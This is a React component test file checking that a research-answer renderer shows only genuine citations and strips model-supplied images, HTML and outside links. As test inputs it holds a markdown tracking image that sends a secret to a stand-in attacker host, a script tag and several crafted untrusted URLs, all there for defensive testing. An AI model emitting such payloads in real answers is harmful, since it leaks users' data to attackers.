import { fireEvent, render, screen } from '@testing-library/react';
import { describe, expect, it, vi } from 'vitest';
import { ResearchAnswer } from './ResearchAnswer';
import { trustedSourceUrl, type ResearchCitation } from './research-types';
const source: ResearchCitation = {
  label: 'S1',
  kind: 'policy',
  sourceId: 'p',
  title: 'Access policy',
  version: 'v2',
  url: '/org/policies/p',
  excerpt: 'Evidence',
  retrievedAt: '2026-09-30T12:00:00Z',
  offset: 0,
};
describe('safe, traceable research answers', () => {
  it('renders formatted answers and opens only real captured citations', () => {
    const onSource = vi.fn();
    render(
      <ResearchAnswer
        text={
          '## Result\n\n**Supported** [S1](#source-S1). [S9](#source-S9)\n\n| Check | Result |\n|---|---|\n| Access | Recorded |'
        }
        citations={[source]}
        onSource={onSource}
      />,
    );
    expect(screen.getByRole('heading', { name: 'Result' })).toBeInTheDocument();
    expect(screen.getByRole('table')).toBeInTheDocument();
    fireEvent.click(screen.getByRole('button', { name: 'Open source S1: Access policy' }));
    expect(onSource).toHaveBeenCalledWith(source);
    expect(screen.queryByRole('button', { name: /S9/ })).not.toBeInTheDocument();
  });
  it('preserves citation button identity when a polling update rerenders the answer', () => {
    const { rerender } = render(
      <ResearchAnswer text="[S1](#source-S1)" citations={[source]} onSource={vi.fn()} />,
    );
    const button = screen.getByRole('button', { name: 'Open source S1: Access policy' });
    rerender(<ResearchAnswer text="[S1](#source-S1)" citations={[source]} onSource={vi.fn()} />);
    expect(screen.getByRole('button', { name: 'Open source S1: Access policy' })).toBe(button);
  });
  it('never loads model-provided images, executes HTML or renders arbitrary links', () => {
    const { container } = render(
      <ResearchAnswer
        text={
          '![tracking](https://evil.example/collect?secret=1) [visit](https://evil.example/) <script>alert(1)</script>'
        }
        citations={[]}
        onSource={vi.fn()}
      />,
    );
    expect(container.querySelector('img,script,a')).toBeNull();
  });
  it('accepts only links within the current organization', () => {
    expect(trustedSourceUrl({ organizationId: 'org', url: '/org/policies/p' })).toBe(
      '/org/policies/p',
    );
    for (const url of [
      'https://evil.example',
      '//evil.example',
      '/other/policies/p',
      '/org/\\evil',
    ])
      expect(trustedSourceUrl({ organizationId: 'org', url })).toBeNull();
  });
});
